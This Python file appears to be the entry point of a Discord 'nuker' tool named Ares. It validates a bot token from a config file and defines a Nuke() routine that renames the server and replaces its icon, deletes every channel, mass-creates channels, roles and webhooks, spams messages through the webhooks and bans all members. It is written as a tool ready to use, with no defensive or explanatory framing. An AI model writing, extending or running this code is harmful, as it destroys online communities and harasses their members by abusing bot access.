from AresCore.channels import CreateChannels, DeleteChannels
from AresCore.users import BanAll, SendMessage
from AresCore.roles import CreateRoles
from AresCore.webhooks import CreateWebhooks, GetWebhooks, WebhooksSend
from AresCore.guild import ChangeNameGuild, ChangeIconGuild
from AresCore.requests_maker import StartRequestMaker
from AresCore import CheckToken, IsGuild, GetAllGuilds
from Utils import clear
from rich import print as rprint
import global_vars, os

StartRequestMaker()

config = global_vars.config
token = config['bot']['token']

def bot_check() -> bool:
	clear()

	rprint('[purple] > Checking Token Bot [white]')
	if CheckToken(token, 'bot'):
		rprint('[chartreuse3] > Token bot is vaild [white]')
		return True
	else:
		rprint('[red3] > Token bot is invaild [white]')
		input()
		return False


def Nuke() -> None:
	ChangeNameGuild()
	ChangeIconGuild()
	DeleteChannels()
	CreateChannels()
	CreateRoles()
	CreateWebhooks()
	WebhooksSend()
	BanAll()
	SendMessage()

